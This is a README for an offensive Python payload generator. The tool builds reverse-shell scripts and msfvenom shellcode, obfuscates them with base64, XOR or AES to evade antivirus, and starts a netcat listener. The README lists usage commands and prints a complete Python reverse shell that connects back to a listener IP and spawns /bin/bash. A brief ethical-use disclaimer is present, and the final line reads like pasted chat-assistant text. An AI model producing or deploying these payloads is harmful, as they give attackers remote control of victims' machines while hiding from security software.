# SPYDIRBYTE Advanced Payload Generator

The SPYDIRBYTE Advanced Payload Generator is a cutting edge Python-based tool designed for cybersecurity professionals to test antivirus and endpoint security solutions. It supports multiple payload types, advanced obfuscation methods, and includes a built in listener setup for reverse shells.

## Features

- **Multiple Payload Types**:
  - Python reverse shells.
  - Raw shellcode payloads (generated with `msfvenom`).
- **Advanced Obfuscation**:
  - Base64 encoding, XOR encryption, and AES encryption with customizable keys.
- **Cross-Platform**:
  - Works on Linux, macOS, and Windows (Python payloads only).
- **Integrated Listener**:
  - Automatically sets up a Netcat listener for testing reverse shell payloads.
- **User-Friendly**:
  - Clear CLI interface with optional advanced features.

## Disclaimer

This tool is intended for **ethical purposes only**. Use it to test systems **you own** or have explicit permission to test. Unauthorized use is illegal and unethical.

## Requirements

- **Operating System**: Kali Linux or any Linux distribution with `msfvenom` installed.
- **Python Version**: Python 3.7 or newer
- **Dependencies**:
  - `cryptography`: Install using `pip install cryptography`

## Installation

Clone the repository and navigate to the directory:

```bash
git clone https://github.com/spydirbyte/payload-generator.git
cd payload-generator
python payload_generator.py -i <listener_ip> -p <listener_port> -t <payload_type> -o <output_file> [--obfuscation <method>] [--setup-listener]
```
Arguments
```bash
-i, --ip: Required. The IP address for the reverse shell listener.
-p, --port: Required. The port for the reverse shell listener.
-t, --type: Required. Payload type:
python: Generates a Python reverse shell script.
shellcode: Generates raw shellcode using msfvenom.
-o, --output: Required. Output file for the payload.
--obfuscation: Optional. Obfuscation method (base64, xor, aes, none).
--setup-listener: Optional. Automatically sets up a Netcat listener.
--aes-key: Optional. AES key for payload encryption (auto-generated if not provided).
```
Examples
Generate a Python Reverse Shell:
```bash
python payload_generator.py -i 192.168.1.10 -p 4444 -t python -o shell.py --obfuscation base64
```

Generate Shellcode:
```bash
python payload_generator.py -i 192.168.1.10 -p 4444 -t shellcode -o shell.bin
```

Generate AES-Encrypted Payload:
```bash
python payload_generator.py -i 192.168.1.10 -p 4444 -t python -o shell.py --obfuscation aes --aes-key mysecretkey123
```

Set Up a Listener Automatically:
```bash
python payload_generator.py -i 192.168.1.10 -p 4444 -t python -o shell.py --setup-listener
```

Output
The payload is saved to the specified file. For example, a Python reverse shell might look like:
```bash
import socket,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('192.168.1.10', 4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
os.system('/bin/bash')
```

Developed by SPYDIRBYTE
```bash
This enhanced tool is powerful, user-friendly, and ideal for ethical cybersecurity practices. Let me know if you want additional features or a GUI!
```
